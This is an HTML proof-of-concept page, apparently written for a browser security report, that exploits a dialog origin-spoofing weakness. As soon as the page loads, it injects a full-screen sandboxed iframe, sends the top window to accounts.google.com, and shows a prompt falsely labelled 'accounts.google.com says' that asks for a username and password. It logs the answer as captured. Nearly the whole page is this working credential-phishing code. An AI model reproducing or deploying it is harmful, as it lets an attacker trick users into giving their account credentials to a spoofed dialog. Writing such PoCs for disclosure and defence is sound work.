<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Missing Origin on Dialog Javascript</title>
  </head>
  <body>
    <script>
      function attack() {
        // Create iframe
        const iframe = document.createElement("iframe");

        // Apply sandbox permissions
        iframe.sandbox =
          "allow-scripts allow-modals allow-popups allow-top-navigation";

        // Style the iframe to cover the entire screen
        iframe.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
        z-index: 9999;
    `;

        // Define iframe content
        iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body style="margin:0;background:#000;">
            <script>
                // Redirect to target site
                top.location.href = "https://accounts.google.com";

                // Trigger prompt after delay
                setTimeout(() => {
                        const fakeOrigin = "accounts.google.com says\\n\\n";
                        const c = prompt(fakeOrigin + "Enter your username:password");
                    if (c) {
                        console.log("CAPTURED:", c);
                    }
                }, 150);
            <\/script>
        </body>
        </html>
    `;

        // Append iframe to the document
        document.body.appendChild(iframe);
      }

      // Execute attack on page load
      window.onload = () => {
        attack();
      };
    </script>
  </body>
</html>
